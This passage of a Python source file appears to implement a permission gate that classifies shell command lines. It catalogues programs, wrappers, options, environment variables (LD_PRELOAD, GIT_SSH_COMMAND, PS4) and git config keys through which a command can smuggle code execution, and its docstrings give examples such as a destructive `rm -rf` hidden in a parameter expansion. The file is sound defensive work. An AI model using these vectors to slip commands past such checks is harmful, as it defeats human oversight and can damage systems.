cat ls grep egrep fgrep rg ag head tail wc pwd echo printf which whereis type stat file basename dirname
realpath readlink du df date cal whoami id uname hostname uptime ps pgrep lsof jq cut tr nl comm rev tac
od strings md5 md5sum shasum sha1sum sha256sum sha512sum cksum seq true false test [ [[ : sleep wait cd
pushd popd dirs export set unset shift exit return local declare typeset readonly hash less more man
nproc sw_vers arch free locale printenv env diff cmp column fold paste join expand unexpand fmt getconf
tput clear command help ulimit umask read jobs compgen
""".split())
SHELL_PROGRAMS = frozenset("""
mkdir touch cp mv ln tee sort uniq tree xxd base64 tar zip unzip gzip gunzip bzip2 bunzip2 xz unxz zstd unzstd
pigz unpigz pbzip2 lbzip2 lz4 lzop lzip lzma unlzma zstdmt brotli
truncate install patch split csplit iconv dos2unix pytest py.test ruff black isort mypy pyright flake8
pylint coverage tsc eslint prettier biome jest vitest mocha rustc rustfmt gcc g++ cc clang clang++ javac
shellcheck shfmt yamllint codespell actionlint security sqlite3 psql mysql duckdb rsync scp ping dig
nslookup host
""".split())
# Tools with subcommands: the subcommands that are plain work. Any other subcommand may run project
# scripts or an alias (npm run, cargo run, go generate), so it asks.
TOOL_SUBCOMMANDS = {
    "npm": "install i ci uninstall un rm remove list ls ll la outdated view info show search audit doctor "
           "cache config root prefix help ping fund explain why --version -v",
    "pnpm": "install i add remove rm list ls outdated why store audit update up --version -v",
    "yarn": "_ install add remove list info why outdated audit upgrade --version -v",
    "bun": "install i add remove rm pm outdated --version -v",
    "uv": "sync lock add remove pip venv tree python version export cache init build self help tool "
          "--version -V",
    "poetry": "install add remove lock show update build check version env config init new --version",
    "pdm": "install lock sync add remove list show build --version",
    "hatch": "env version build --version",
    "pip": "install uninstall list show freeze download wheel check config cache index inspect hash debug "
           "help --version -V",
    "pipx": "install uninstall list upgrade inject ensurepath --version",
    "cargo": "build b check c test t fmt clippy doc tree add remove update fetch metadata bench new init "
             "search install clean vendor version --version -V",
    "go": "build test vet fmt mod list get install version env doc clean work help",
    "brew": "install uninstall reinstall list ls info search update upgrade outdated doctor config deps "
            "leaves cleanup tap --version",
    "apt": "install remove purge update upgrade list search show policy autoremove",
    "apt-get": "install remove purge update upgrade autoremove",
    "docker": "ps images logs inspect version info build pull tag stats top history network volume --version",
    "kubectl": "get describe logs explain version top api-resources api-versions rollout diff cluster-info",
    "terraform": "init plan validate fmt show output providers version graph workspace",
    "pulumi": "preview stack version about logs",
    "helm": "list ls status get template lint repo search show version dependency package history",
    "deno": "test fmt lint check info doc bench cache --version",
    "gem": "install list uninstall search info env --version",
    "twine": "check",
    "launchctl": "list print",
    "systemctl": "status list-units list-timers is-active is-enabled show cat",
}
TOOL_SUBCOMMANDS = {k: frozenset(v.split()) for k, v in TOOL_SUBCOMMANDS.items()}
_RUN_WRAPPERS = {("uv", "run"), ("poetry", "run"), ("pdm", "run"), ("pipenv", "run"), ("hatch", "run")}
_WRAPPER_VALUE_OPTS = {"--with", "--with-requirements", "--with-editable", "--python", "-p", "--project",
                       "--directory", "--package", "--extra", "--group", "--only-group", "--env-file", "--index",
                       "--index-url", "--extra-index-url", "-e", "--env"}
_SHELLS = {"bash", "sh", "zsh", "dash", "ksh", "fish", "mksh", "busybox"}
# interpreter -> flags whose value is program text
_INTERPRETERS = {"python": ("-c",), "pypy": ("-c",), "node": ("-e", "--eval", "-p", "--print"),
                 "nodejs": ("-e", "--eval", "-p", "--print"), "perl": ("-e", "-E"), "ruby": ("-e",),
                 "php": ("-r",), "lua": ("-e",), "luajit": ("-e",), "Rscript": ("-e",), "R": ("-e",),
                 "osascript": ("-e",), "pwsh": ("-c", "-Command", "-command"), "powershell": ("-c", "-Command"),
                 "julia": ("-e", "--eval"), "tclsh": (), "wish": (), "java": (), "groovy": ("-e",),
                 "scala": ("-e",), "elixir": ("-e",), "erl": ("-eval",), "swift": (), "irb": (), "ghci": (),
                 "runghc": (), "jshell": (), "bun": ("-e", "--eval"), "deno": ()}
_INTERP_VALUE_FLAGS = {"python": ("-X", "-W"), "pypy": ("-X", "-W"), "node": ("-r", "--require", "--import", "--loader"),
                       "ruby": ("-r", "-I"), "perl": ("-I",)}
_SAFE_PY_MODULES = {"pytest", "pip", "venv", "json.tool", "ruff", "mypy", "black", "isort", "unittest",
                    "compileall", "py_compile", "coverage", "build", "pydoc", "pyright", "flake8", "pylint"}
# Wrappers that run a command given in their arguments (#160): program -> options that take a value. An option
# ending in "=" takes one only attached (`-mFILE`, `--mount=FILE`). The command is the argv after the options
# and _WRAPPER_OPERANDS operands (a lock file, a new root, a CPU mask, a priority), or a shell command string
# (`flock -c`, `script -c`, `tmux -c`, watch without -x, a tmux shell-command, a parallel template).
_WRAPPERS = {
    "setsid": (), "chronic": (), "unbuffer": (), "catchsegv": (), "firejail": (), "taskset": (),
    "dbus-run-session": ("--dbus-daemon", "--config-file"),
    "flock": ("-w", "--timeout", "--wait", "-E", "--conflict-exit-code", "-c", "--command"),
    "chroot": ("--userspec", "--groups"),
    "chrt": ("-T", "--sched-runtime", "-P", "--sched-period", "-D", "--sched-deadline"),
    "numactl": ("-C", "--physcpubind", "-N", "--cpunodebind", "-m", "--membind", "-p", "--preferred", "-i",
                "--interleave", "-P", "--preferred-many", "-w", "--weighted-interleave"),
    "xvfb-run": ("-e", "--error-file", "-f", "--auth-file", "-n", "--server-num", "-p", "--xauth-protocol", "-s",
                 "--server-args", "-w", "--wait"),
    "unshare": ("-R", "--root", "-w", "--wd", "-S", "--setuid", "-G", "--setgid", "--map-user", "--map-group",
                "--map-users", "--map-groups", "--propagation", "--setgroups", "--monotonic", "--boottime",
                "-m=", "-u=", "-i=", "-n=", "-p=", "-U=", "-C=", "-T="),
    "nsenter": ("-t", "--target", "-W", "--wdns", "-S", "--setuid", "-G", "--setgid", "-m=", "-u=", "-i=", "-n=",
                "-p=", "-C=", "-U=", "-T=", "-r=", "-w="),
    "systemd-run": ("-H", "--host", "-M", "--machine", "-u", "--unit", "-p", "--property", "--description",
                    "--slice", "--expand-environment", "--service-type", "--uid", "--gid", "--nice",
                    "--working-directory", "-E", "--setenv", "-C", "--capsule", "--json", "--background",
                    "--path-property", "--socket-property", "--timer-property", "--on-active", "--on-boot",
                    "--on-startup", "--on-unit-active", "--on-unit-inactive", "--on-calendar"),
    "watch": ("-n", "--interval", "-q", "--equexit", "-d="),
    "script": ("-I", "--log-in", "-O", "--log-out", "-B", "--log-io", "-T", "--log-timing", "-m", "--logging-format",
               "-E", "--echo", "-o", "--output-limit", "-c", "--command", "-t="),
    "tmux": ("-c", "-f", "-L", "-S", "-T"),
    "screen": ("-c", "-e", "-h", "-p", "-s", "-S", "-t", "-T"),
    "parallel": ("-a", "--arg-file", "--arg-file-sep", "--arg-sep", "--basefile", "--bf", "--block", "--block-size",
                 "-C", "--colsep", "-d", "--delimiter", "--delay", "-E", "--env", "--halt", "--header", "-I", "-j",
                 "--jobs", "-P", "--max-procs", "--joblog", "-L", "--max-lines", "-n", "--max-args", "-N", "--load",
                 "--memfree", "--nice", "--results", "--res", "--retries", "--return", "-s", "--max-chars", "-S",
                 "--sshlogin", "--slf", "--sshloginfile", "--ssh", "--tagstring", "--timeout", "--tmpdir",
                 "--termseq", "--transferfile", "--tf", "--wd", "--workdir", "--rpl", "--sshdelay", "--profile",
                 "-J"),
}
_WRAPPER_OPERANDS = {"flock": 1, "chroot": 1, "taskset": 1, "chrt": 1}
# Wrappers that run the command as another user, in other namespaces or as a system unit: like sudo, the line
# carries a signal named after the wrapper and a reversible part counts as costly.
_PRIVILEGED_WRAPPERS = ("chroot", "nsenter", "unshare", "systemd-run")
# tmux commands that take a shell-command, with their options that take a value
_TMUX_RUNS = {"new-session": "cefFnstxy", "new-window": "ceFnt", "split-window": "ceFlpt", "respawn-pane": "cet",
              "respawn-window": "cet", "run-shell": "cdt"}
_TMUX_ALIASES = {"new": "new-session", "neww": "new-window", "splitw": "split-window", "respawnp": "respawn-pane",
                 "respawnw": "respawn-window", "run": "run-shell", "splitp": "split-window",
                 "split-pane": "split-window"}
_OPAQUE_PROGRAMS = {"source": "reads and runs a shell file", ".": "reads and runs a shell file",
                    "alias": "defines an alias", "function": "defines a shell function",
                    "trap": "sets a command to run on a signal", "make": "runs Makefile recipes",
                    "gmake": "runs Makefile recipes", "just": "runs justfile recipes", "task": "runs task recipes",
                    "rake": "runs Rakefile tasks", "npx": "downloads and runs a package", "bunx": "downloads and "
                    "runs a package", "uvx": "downloads and runs a tool", "pnpx": "downloads and runs a package",
                    "watch": "re-runs a command through a shell", "parallel": "runs commands through a shell",
                    "tmux": "runs commands in a terminal multiplexer", "screen": "runs commands in a terminal "
                    "multiplexer", "tox": "runs project-defined commands", "nox": "runs project-defined commands",
                    "pre-commit": "runs project-defined hooks", "open": "opens a file or app with its handler",
                    "case": "a case statement", "coproc": "a coprocess", "select": "a select loop",
                    "script": "runs a command under a recorder"}
# Allowlisted programs with an option whose value is a command line the program runs (#154). The value is
# classified as a nested command, like the command after `find -exec`. Long options match any prefix, one letter
# or more, as getopt_long and git do (`--to-com=`, `psql --o`). Short options are read as getopt reads them (see
# _option_values): the value is the rest of the word or the next word (`-Izstd`, `-xIzstd`, `-avze ssh`).
_EXEC_OPTS = {
    "tar": ("--to-command", "-I", "--use-compress-program", "--rsh-command", "--rmt-command", "--set-mtime-command"),
    "split": ("--filter",), "sort": ("--compress-program",), "man": ("-P", "--pager"),
    "rsync": ("-e", "--rsh", "--rsync-path"), "scp": ("-S", "-D"), "sftp": ("-S", "-D"), "rg": ("--pre",),
    "zip": ("-TT", "--unzip-command"),
}
# git subcommand -> options whose value git runs (locally, or on the remote for a local-path remote). ls-remote
# takes a hidden `--exec` for `--upload-pack` (#230); it rejects `-u`, which is still read so that no line asks less.
_GIT_EXEC_OPTS = {"rebase": ("-x", "--exec"), "push": ("--receive-pack", "--exec"), "archive": ("--exec",),
                  "fetch": ("--upload-pack",), "clone": ("--upload-pack", "-u"), "pull": ("--upload-pack",),
                  "ls-remote": ("--upload-pack", "--exec", "-u")}
# Options whose value is a script file or option text the gate cannot read: opaque.
_EXEC_FILE_OPTS = {"tar": ("-F", "--info-script", "--new-volume-script"), "sqlite3": ("-init",), "duckdb": ("-init",)}
# The short options that take a value (the letters before `:` in the program's getopt string) and long options
# that take one, so the option reader skips a value instead of reading it as options: `ssh -oServerAliveInterval=60`
# is `-o`, not `-I`. A letter or name missing here makes the reader look at more words, except for ssh, whose
# options stop at the remote command: its letters are ssh's getopt string, all of them.
_SSH_VALUE_OPTS = "BbcDEeFIiJLlmOoPpQRSWw"
_VALUE_OPTS: dict[str, tuple[str, tuple[str, ...]]] = {
    "ssh": (_SSH_VALUE_OPTS, ()), "scp": ("cDFiJlMoPSX", ()), "sftp": ("BbcDFiJloPRSsX", ()),
    "tar": ("bCfFgHIKLNTVX", ("--file", "--directory", "--exclude", "--exclude-from", "--files-from", "--transform",
                              "--owner", "--group", "--mode", "--mtime", "--newer", "--format", "--suffix")),
    "rsync": ("BefMT@", ("--exclude", "--include", "--exclude-from", "--include-from", "--files-from", "--filter",
                         "--temp-dir", "--compare-dest", "--copy-dest", "--link-dest", "--partial-dir", "--backup-dir",
                         "--chmod", "--chown", "--timeout", "--port", "--password-file", "--log-file", "--out-format",
                         "--bwlimit", "--max-size", "--min-size", "--remote-option")),
    "man": ("CELMPRSemprs", ()),
    "rg": ("ABCdEefgjMmrTt", ("--regexp", "--file", "--glob", "--iglob", "--type", "--type-not", "--max-count",
                              "--max-depth", "--replace", "--context", "--after-context", "--before-context")),
    "psql": ("cdFfhLoPpRTUv", ("--command", "--dbname", "--file", "--host", "--port", "--username", "--set",
                               "--variable", "--log-file", "--output", "--pset", "--field-separator")),
}
_GIT_VALUE_OPTS = {"rebase": "CsXx", "push": "o", "archive": "o", "fetch": "jo", "clone": "bcjou", "pull": "josX",
                   "ls-remote": "ou"}
# ssh/scp/sftp -o settings that run a command (RemoteCommand on the remote host) or load a library, by the
# lower-case keyword ssh matches (see _ssh_setting).
_SSH_EXEC_SETTINGS = {k.lower(): k for k in ("ProxyCommand", "LocalCommand", "RemoteCommand", "KnownHostsCommand")}
_SSH_LIB_SETTINGS = {k.lower(): k for k in ("PKCS11Provider", "SecurityKeyProvider")}
# Variables set before a program (also through env or sudo), exported or assigned bare on the line.
# _EXEC_ENV: the value is a command line the program runs, classified as a nested command.
_EXEC_ENV = frozenset("""
GIT_SSH_COMMAND GIT_SSH GIT_PAGER GIT_EDITOR GIT_SEQUENCE_EDITOR GIT_EXTERNAL_DIFF GIT_ASKPASS SSH_ASKPASS
RSYNC_RSH PAGER MANPAGER EDITOR VISUAL LESSOPEN LESSCLOSE GIT_PROXY_COMMAND BROWSER GH_PAGER GH_EDITOR GH_BROWSER
PSQL_PAGER PSQL_EDITOR SUDO_ASKPASS SUDO_EDITOR RSYNC_CONNECT_PROG PROMPT_COMMAND PS4
""".split())
# PS4 is not a command line but a prompt bash expands before every traced command (`set -x`), interactive or not:
# its `$( )` and backticks run. Its value is read as that double-quoted text (_prompt_text).
# _EXEC_ENV_OPAQUE: the value is not a command the gate can read but decides what code runs: options the
# program parses, libraries the loader injects, or where programs, modules, startup and config files are
# found (HOME picks ~/.gitconfig, ~/.ssh/config and ~/.exo), and CDPATH, which moves a relative `cd` where
# the gate cannot tell whether later writes land in the Exo store. Opaque, named. An empty CDPATH turns
# it off (`CDPATH= cd src`). Left out: IFS, which does not change how literal words split (expansions are
# opaque already). LESS counts only with a `+` command in it (`LESS=-R` stays allow).
_EXEC_ENV_OPAQUE = {
    **dict.fromkeys("TAR_OPTIONS NODE_OPTIONS PERL5OPT RUBYOPT MANOPT ZIPOPT".split(),
                    "sets options the gate does not read"),
    "RIPGREP_CONFIG_PATH": "points rg at a config file the gate does not read",
    **dict.fromkeys("""LD_PRELOAD LD_AUDIT LD_LIBRARY_PATH GCONV_PATH DYLD_INSERT_LIBRARIES DYLD_LIBRARY_PATH
        DYLD_FRAMEWORK_PATH DYLD_FALLBACK_LIBRARY_PATH DYLD_FALLBACK_FRAMEWORK_PATH OPENSSL_CONF OPENSSL_ENGINES
        OPENSSL_MODULES""".split(), "changes which libraries are loaded"),
    **dict.fromkeys("""PATH HOME XDG_CONFIG_HOME BASH_ENV ENV ZDOTDIR GIT_EXEC_PATH GIT_TEMPLATE_DIR
        GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM PYTHONSTARTUP PYTHONPATH PYTHONHOME PYTHONUSERBASE PERL5LIB PERLLIB
        RUBYLIB NODE_PATH PSQLRC""".split(), "changes which programs, modules or startup and config files are used"),
    "CDPATH": "moves cd, so the gate cannot tell whether writes land in the Exo store",
    "BASH_CMDS": "rebinds a program name to another file, as hash -p does",
    "BASH_ALIASES": "defines an alias",
    "GIT_ALLOW_PROTOCOL": "lets git use transports such as ext::, whose URL is a command git runs",
}
# git config from the environment, `git -c` by another name: GIT_CONFIG_KEY_<n> with GIT_CONFIG_VALUE_<n>
# (GIT_CONFIG_COUNT alone sets nothing), and GIT_CONFIG_PARAMETERS. The pairs take _git_config_kind.
_GIT_CONFIG_ENV = re.compile(r"GIT_CONFIG_(KEY|VALUE)_(\d+)")
_EXPORTERS = ("export", "declare", "typeset", "readonly", "local")


# Values of a listed variable that change nothing the gate relies on, so everyday lines keep their class: an empty
# loader variable (the loader skips it), git's global or system config pointed at /dev/null (nothing is read), an
# empty CDPATH (it turns CDPATH off), and a PATH made of the current one and folders the gate already trusts a
# program from by path (_trusted_path: a system bin folder, a virtualenv's or node_modules/.bin). An empty element
# is the current folder, so `PATH= ls` and `PATH=$PATH: ls` still ask; so does any other folder, appended or not,
# since it supplies every program the earlier ones lack, and a folder written with `..`, which the system resolves
# through links (`/tmp/s/../../usr/bin`). `$PATH` is the current value only where bash expands it: in single quotes,
# `$'..'` or after a backslash it is a folder named `$PATH` (`literal`: the assignment holds such text).
_EMPTY_IS_UNSET = frozenset("""LD_PRELOAD LD_AUDIT LD_LIBRARY_PATH GCONV_PATH DYLD_INSERT_LIBRARIES DYLD_LIBRARY_PATH
    DYLD_FRAMEWORK_PATH DYLD_FALLBACK_LIBRARY_PATH DYLD_FALLBACK_FRAMEWORK_PATH CDPATH""".split())


def _harmless_value(name: str, value: str | None, literal: bool = False) -> bool:
    if value is None:
        return False
    if name in _EMPTY_IS_UNSET:
        return value == ""
    if name in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM"):
        return value == "/dev/null"
    return name == "PATH" and all(not literal and d in ("$PATH", "${PATH}") or d and not re.search(r"[*?\[]", d)
                                  and ".." not in d.split("/") and (
        os.path.normpath(_expand_text(d)) in _SYSTEM_BIN or bool(_ENV_BIN.search(d.rstrip("/") + "/x")))
        for d in value.split(":"))


def _kept_text(raw: str) -> bool:
    """The source text of an assignment holds text bash keeps as written: single quotes, `$'..'` or a backslash
    (or no source text at all, which counts the same)."""
    return not raw or "'" in raw or "\\" in raw


def _env_hazard(name: str, value: str | None = None, literal: bool = False) -> str:
    """Why setting this variable matters to the gate ("" when it does not). `value` None means the line
    sets it to a value the gate does not see (`read`, `printf -v`, a for loop, a nameref). `literal`: the
    assignment's source holds quoted or escaped text (_kept_text)."""
    if name == "PS4":
        return "is expanded, $( ) included, before each traced command"
    if name in _EXEC_ENV:
        return "holds a command a program runs"
    if name in _EXEC_ENV_OPAQUE and not _harmless_value(name, value, literal):
        return _EXEC_ENV_OPAQUE[name]
    if name == "LESS" and (value is None or "+" in value):
        return "sets a command less runs at start"
    if name == "GIT_CONFIG_PARAMETERS" or _GIT_CONFIG_ENV.fullmatch(name):
        return "sets git config"
    return ""


# A variable the gate assigns without a plain NAME=value word. Parameter expansion assigns with `:=` or
# `=` (not `:-`/`-`, which only substitute); arithmetic (`$((NAME=n))`, and bash's legacy `$[NAME=n]` #588)
# and an array subscript (`a[NAME=n]`, itself arithmetic) assign an integer, and so sets an element of an
# array (`BASH_CMDS[ls]=1`); a `{NAME}>` redirection drops the fd number into NAME. Each sets the
# variable as a side effect, whatever the program is, so a listed variable set this way must be read too.
# Only what bash expands counts: the ${..} and $((..)) the lexer met outside single quotes (_Word.exps), each
# read to the } bash closes it with and with quoted text blanked (_dollar_brace), and a bracket only as the
# subscript of a name (`echo [HOME=x]` is a glob, `'${PATH:=.}'` and `${a:-'${PATH:=.}'}` are text).
_PARAM_NAME = re.compile(r"\$\{([A-Za-z_]\w*)")            # then a subscript, and `:=` or `=` to assign
_ARITH_SET = re.compile(r"\b([A-Za-z_]\w*)\s*(?:(?:<<|>>|[-+*/%&|^])?=(?!=)|\+\+|--)|(?:\+\+|--)\s*([A-Za-z_]\w*)")
_ARITH_ELEM = re.compile(r"\b([A-Za-z_]\w*)\s*\[[^\][]*\]\s*=(?!=)")   # an element set inside the arithmetic
_SUBSCRIPT = re.compile(r"[A-Za-z_]\w*\[([^\]]*)\]")
_EXP_SUBSCRIPT = re.compile(r"\$\{[#!]?[A-Za-z_]\w*\[")
_FD_VAR = re.compile(r"\{([A-Za-z_]\w*)\}")
_LONG_VALUE = 64   # a nested ${..} longer than this stands in a value as `${_}`, so no text is copied twice


def _pairs(text: str, opener: str, closer: str) -> dict[int, int]:
    """Each `opener` in text: the index of the `closer` that matches it, as bash counts them (len(text) if none).
    One stack pass, so a long run of unclosed openers stays linear."""
    out, stack = {}, []
    for m in re.finditer(re.escape(opener) + "|" + re.escape(closer), text):
        if m.group() == opener:
            stack.append(m.start())
        elif stack:
            out[stack.pop()] = m.start()
    out.update(dict.fromkeys(stack, len(text)))
    return out


def _spans(text: str) -> tuple[list[tuple[int, int]], list[tuple[int, int]]]:
    """(arithmetic bodies, expansion subscripts) in `text` as (start, end): the body of each `$(( ))` and of bash's
    legacy `$[ ]` (#588), read as the `$((..))` it stands for, not inside another, and the subscript of each
    `${a[`, `${#a[` or `${!a[` to its matching `]`; arithmetic, where a bare `NAME=n` assigns."""
    parens, brackets = _pairs(text, "(", ")"), _pairs(text, "[", "]")
    arith, i = [], 0
    while True:
        j, k = text.find("$((", i), text.find("$[", i)
        if j >= 0 and (k < 0 or j < k):                   # the earlier form is read, to its own close
            end = parens[j + 1] if parens[j + 1] < len(text) else len(text) - 1
            arith.append((j + 3, end))
            i = max(end, j + 3)
        elif k >= 0:
            end = brackets[k + 1]
            arith.append((k + 2, end))
            i = max(end, k + 2)
        else:
            break
    return arith, [(m.end(), brackets[m.end() - 1]) for m in _EXP_SUBSCRIPT.finditer(text)]


def _covered(spans: list[tuple[int, int]]) -> list[tuple[int, int]]:
    """The spans merged into disjoint ones, in order."""
    out: list[tuple[int, int]] = []
    for a, b in sorted(spans):
        if out and a <= out[-1][1]:
            out[-1] = (out[-1][0], max(out[-1][1], b))
        else:
            out.append((a, b))
    return out


def _brace_value(src: str, frames: dict, at: int, start: int) -> str:
    """The text of the `${` at `at` from `start` to its close, with each nested ${..} longer than _LONG_VALUE as
    `${_}`: each character is copied into one value at most, however deep the nesting."""
    pieces, pos = [], start
    for child in frames[at][2]:
        end = frames[child][0]
        if end < pos:
            continue
        pieces += [src[pos:child]] if child >= pos else []
        pieces.append(src[child:end + 1] if child >= pos and end + 1 - child <= _LONG_VALUE else "${_}")
        pos = end + 1
    return "".join(pieces) + src[pos:frames[at][0]]


def _unquote_value(v: str) -> str:
    """The value a parameter-expansion assignment gives, quotes removed as bash removes them, so a command
    value (`${GIT_PAGER:='rm -rf x'}`, `${GIT_SSH_COMMAND:=rm' -rf x'}`) reads as the command it is."""
    return re.sub(r"'([^']*)'|\"([^\"]*)\"|\\(.)", lambda m: "".join(g or "" for g in m.groups()), v)


def _prompt_text(value: str) -> str:
    """A PS4 value as the command line that expands it the way bash does (`: "<value>"`), or "" when nothing in it
    runs. Backslashes are dropped first: bash decodes the prompt's own escapes (`\\$` is `$`) before it expands."""
    if "$" not in value and "`" not in value:
        return ""
    return ': "' + value.replace("\\", "").replace('"', '\\"') + '"'


def _subscript_sets(name: str) -> list[str]:
    """The variables assigned inside the subscript of a `NAME[...]` word (`a[PATH=10]` sets PATH)."""
    m = _SUBSCRIPT.match(name)
    return [a.group(1) or a.group(2) for a in _ARITH_SET.finditer(m.group(1))] if m else []


def _hidden_sets(k: "_Cmd", names: list[str]) -> list[tuple[str, str | None, bool]]:
    """(name, value, literal) for each variable the command assigns without a plain NAME=value word, each once.
    value is None when the gate does not see it (an fd number, an arithmetic result); literal: the value's source
    holds quoted or escaped text (_kept_text). Covers parameter-expansion
    assignment, arithmetic, a subscript in an expansion (`${a[PATH=10]}`, also `${a[PATH=${i}]}`) or in
    `names` (the words bash reads as a variable name: assignments, exporter and unset arguments), and a
    `{NAME}>` redirection. Linear in the line: brackets, parens and braces are each matched in one pass."""
    out: list[tuple[str, str | None, bool]] = []
    for w in [*k.words, *(t for _, t in k.redirs), *k.herestrings]:
        for vis, src, frames in w.exps:                   # only real expansions, quoted text blanked in vis
            if frames is None:                            # a $((..)): its ${..} as the lexer reads one
                frames = _dollar_brace(src, 0)[2]
            frames = {at: [end, up, []] for at, (end, up) in frames.items()}
            for at, (_, up, _) in frames.items():         # in order of start, so each child list is too
                if up in frames:
                    frames[up][2].append(at)
            brackets, asked, close_at = _pairs(vis, "[", "]"), 0, -1
            for m in _PARAM_NAME.finditer(vis):
                pos = m.end()
                if vis.startswith("[", pos):              # a subscript: PATH[0] is PATH
                    pos = brackets[pos] + 1
                op = 2 if vis.startswith(":=", pos) else 1 if vis.startswith("=", pos) else 0
                if not op:
                    continue
                if m.start() not in frames:               # not a ${ the scan opened: up to the next }
                    if not asked <= pos <= close_at:      # the last answer holds while pos stays before it
                        asked, close_at = pos, src.find("}", pos)
                        close_at = len(src) if close_at < 0 else close_at
                    frames[m.start()] = [close_at, None, []]
                raw = _brace_value(src, frames, m.start(), pos + op)
                out.append((m.group(1), _unquote_value(raw), "'" in raw or "\\" in raw))
            arith, subs = _spans(vis)
            for region in (arith, subs):
                for a, b in _covered(region):
                    out += [(m.group(1) or m.group(2), None, False) for m in _ARITH_SET.finditer(vis, a, b)]
                    out += [(m.group(1), None, False) for m in _ARITH_ELEM.finditer(vis, a, b)]
    out += [(n, None, False) for name in names for n in _subscript_sets(name)]
    if k.redirs:                                          # `{NAME}>file`: the fd number goes into NAME
        out += [(fm.group(1), None, False) for w in k.words if not w.quoted and (fm := _FD_VAR.fullmatch(w.text))]
    # Named descriptors assign their variable even when the lexer stores it on the redirection.
    targets = [t for _, t in k.redirs] + list(k.heredocs) + list(k.herestrings)
    out += [(fm.group(1), None, False) for t in targets if (fm := _FD_VAR.fullmatch(t.fd))]
    return list(dict.fromkeys(out))


def _applies_late(k: "_Cmd") -> bool:
    """True when this command's assignments apply only after its own words have expanded (#579): bash expands
    every argument of export and its kind before any of the assignments takes effect, so a ${..@P} in one reads
    the value from before the command."""
    words = k.words
    return bool(words) and not words[0].quoted and not words[0].dynamic and words[0].text in _EXPORTERS


def _literal_assigns(k: "_Cmd", line: dict) -> dict[str, str | None]:
    """What one command assigns, as written (#579), and the value each name holds after it: a `NAME=value`
    word whose value holds no `$`, backtick or backslash gives the literal a prompt expansion of it expands
    to itself, and a value the gate cannot read gives None — the last assignment wins, literal or not, as does
    a name the gate cannot name (`p[$i]=x`). A bare assignment's own words, and the arguments of export and its
    kind; `printf -v` and `read` set values the gate does not see, a for list is data the command runs over, and
    an append (`p+=x`) joins the value the line knows: a literal onto a literal is one, anything else is None."""
    words = k.words
    if _applies_late(k):
        words = words[1:]
    elif not all(_ASSIGN.fullmatch(w.text) for w in words):
        return {}
    out: dict[str, str | None] = {}
    for w in words:
        name, eq, value = w.text.partition("=")
        if re.match(r"[A-Za-z_]\w*\+=", w.text):
            name = name[:-1]                          # an append: onto the literal the line knows, or onto None
            cur = out[name] if name in out else line.get(name)
            out[name] = cur + value if cur is not None and not re.search(r"[$`\\]", value) else None
            continue
        if not eq:
            continue                                  # `export p`: it exports a value the line knows or not
        out[name] = value if not (re.search(r"[$`\\]", value) or re.search(r"[$`]", name)) else None
    return out


def _unreadable_name(w: "_Word") -> bool:
    """The variable name in this word is one the gate cannot resolve: a glob the shell expands before the
    builtin sees it (`PAT?=.`, `read HOM[E]`), or a name spliced from an expansion (`export $X=...`)."""
    if w.glob:
        return True
    name = re.split(r"\[|\+?=", w.text, maxsplit=1)[0]
    return w.dynamic and bool(re.search(r"[$`]", name))


# sqlite3/duckdb dot-commands (any unambiguous prefix works, so match prefixes): .shell and .system run a
# command, .once/.output/.import/.read run one when an argument starts with `|` (after options too:
# `.import --csv '|cmd' t`), .once/.output/.read/.load otherwise use a file or library the gate does not see
# (.import FILE is a plain data load). psql runs `\!`, and `\o`, `\out`, `\g`, `\gx`, `\w`, `\write` with a
# `|command` (also quoted, or after `\g (options)`), wherever they appear on a line; mysql runs `\!` and, at the
# start of one, `system` (psql has no `system`: a line starting `system` is SQL there). Line starts are matched
# with `[ \t]*`, not `\s*`, so a long heredoc stays linear.
_DOT_RUN, _DOT_PIPE = ("shell", "system"), ("once", "output", "import", "read")
_DOT_FILE = ("once", "output", "read", "load")
_DOT_COMMAND = re.compile(r"^[ \t]*\.([a-z]+)[ \t]*([^\n]*)", re.M)
_DOT_PIPE_ARG = re.compile(r"""(?:^|[ \t])(?:(['"])\|(.*?)\1|\|(.*))""", re.S)
_SQL_SHELL = {"mysql": re.compile(r"(?:^[ \t]*system[ \t]+|\\![ \t]*)([^\n]*)", re.M | re.I),
              "psql": re.compile(r"\\![ \t]*([^\n]*)")}
# The pipe after `\o`, `\g (options)`... is found in one pass over these tokens, so many on one line stay linear.
_SQL_PIPE = re.compile(r"\\(?:o|out|w|write|gx?)(?![a-z])|[|\n]", re.I)
# psql runs backquoted text in a meta-command's arguments (`\set x `cmd``, `\echo `cmd``)
_PSQL_META = re.compile(r"\\[a-z][^\n]*", re.I)
_SQL_PROGRAM = re.compile(r"\bprogram\s+(?:E?'|\$\w*\$)", re.I)
# database shells -> the options whose value is command text (dot-commands or SQL)
_SQL_COMMAND_OPTS = {"sqlite3": ("-cmd",), "duckdb": ("-cmd",), "psql": ("-c", "--command"),
                     "mysql": ("-e", "--execute")}
_GIT_SUBS = frozenset("""
add commit checkout switch branch merge rebase stash tag fetch pull push status log diff show reset restore
clean rm mv init clone remote config rev-parse blame ls-files grep cherry-pick revert worktree submodule
describe shortlog reflog bisect apply am format-patch archive gc fsck notes rev-list cat-file for-each-ref
symbolic-ref update-ref ls-remote ls-tree show-ref version help range-diff whatchanged sparse-checkout
maintenance count-objects verify-commit verify-tag merge-base name-rev check-ignore check-attr var
""".split())
_GIT_EXEC_KEY = re.compile(r"^(alias\..+|core\.(pager|editor|sshcommand|hookspath|fsmonitor|askpass|gitproxy)|"
                           r"sequence\.editor|diff\.external|interactive\.difffilter|gc\.recentobjectshook|.+\.[\w-]*(command|cmd)|"
                           r".+\.(textconv|clean|smudge|process|driver|program|helper)|credential\..*|pager\..+|"
                           r"filter\..+|uploadpack\..+|remote\..+\.(uploadpack|receivepack)|"
                           r"(difftool|mergetool|man|browser)\..+\.path)$", re.I)
# git config keys that load more config or a template the gate does not read: an included file can set any
# exec key, and the hooks in a template run (init.templateDir is git clone --template by another name).
_GIT_LOAD_KEY = re.compile(r"^(include\.path|includeif\..+\.path|init\.templatedir)$", re.I)
# git config that lets git reach a remote through `ext::`, whose URL is a command git runs: the switches that
# allow the transport (it is off by default), a URL rewrite to an ext:: base, and a remote whose URL is one.
_GIT_EXT_ALLOW = re.compile(r"^protocol\.(ext\.)?allow$", re.I)
_GIT_EXT_URL_KEY = re.compile(r"^(url\.ext::.*\.(push)?insteadof|remote\..+\.(push)?url)$", re.I | re.S)
_GH_GROUPS = frozenset("""
pr issue repo api auth release gist workflow run label secret variable ssh-key gpg-key search browse status
